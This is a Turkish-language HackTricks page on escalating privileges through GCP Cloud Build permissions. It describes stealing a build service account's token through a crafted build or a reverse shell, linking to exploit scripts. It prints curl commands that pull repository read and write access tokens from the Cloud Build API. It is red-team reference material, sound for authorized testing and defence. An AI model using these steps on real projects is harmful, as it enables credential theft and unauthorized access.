# GCP - Cloudbuild Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'i takip edin.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.

</details>

## cloudbuild

Cloud Build hakkında daha fazla bilgi için kontrol edin:

{% content-ref url="../gcp-services/gcp-cloud-build-enum.md" %}
[gcp-cloud-build-enum.md](../gcp-services/gcp-cloud-build-enum.md)
{% endcontent-ref %}

### `cloudbuild.builds.create`

Bu izinle bir **bulut yapısı oluşturabilirsiniz**. Cloudbuild makinesi, **varsayılan olarak cloudbuild Hizmet Hesabı'nın bir belirteci** olan `<PROJE_NUMARASI>@cloudbuild.gserviceaccount.com` içerir. Bununla birlikte, cloudbuild yapılandırmasında **proje içindeki herhangi bir hizmet hesabını belirtebilirsiniz**.\
Bu nedenle, makineyi sadece belirteci sunucunuza dışa aktarabilir veya **içine ters kabuk alabilir ve belirteci kendiniz alabilirsiniz** (belirteci içeren dosya değişebilir).

Orijinal saldırı betiğini [**burada GitHub'ta**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py) bulabilirsiniz (ancak belirteci nereden aldığı konumu benim için çalışmadı). Bu nedenle, [**bir zafiyetli ortamın oluşturulması, saldırı ve temizleme işlemlerini otomatikleştiren bir betik**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/f-cloudbuild.builds.create.sh) ve cloudbuild makinesi içinde ters kabuk almak ve [**çalmak için bir python betiği**](https://github.com/carlospolop/gcp\_privesc\_scripts/blob/main/tests/f-cloudbuild.builds.create.py) bulabilirsiniz (koddan diğer hizmet hesaplarını nasıl belirteceğinizi bulabilirsiniz)**.**

Daha detaylı bir açıklama için [https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/](https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/) adresini ziyaret edin.

### `cloudbuild.builds.update`

Bu izinle **potansiyel olarak** bir bulut yapısını **güncelleyebilir ve hizmet hesabı belirteci çalabilirsiniz**. Ancak, bu yazının yazıldığı sırada bu API'yi çağırmak için herhangi bir yol bulamadım.

TODO

### `cloudbuild.repositories.accessReadToken`

Bu izinle kullanıcı, depoya erişmek için kullanılan **okuma erişim belirtecini** alabilir:

{% code overflow="wrap" %}
```
```
{% endcode %}

```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadToken"
```

### `cloudbuild.repositories.accessReadWriteToken`

Bu izinle kullanıcı, depoya erişmek için kullanılan **okuma ve yazma erişim belirteci**ni alabilir:

{% code overflow="wrap" %}
```
```
{% endcode %}

```bash
curl -X POST \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
-H "Content-Type: application/json" \
-d '{}' \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadWriteToken"
```

### `cloudbuild.connections.fetchLinkableRepositories`

Bu izinle, bağlantının erişimine sahip olduğu depoları alabilirsiniz:

{% code overflow="wrap" %}
```bash
curl -X GET \
-H "Authorization: Bearer $(gcloud auth print-access-token)" \
"https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>:fetchLinkableRepositories"
```
{% endcode %}

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
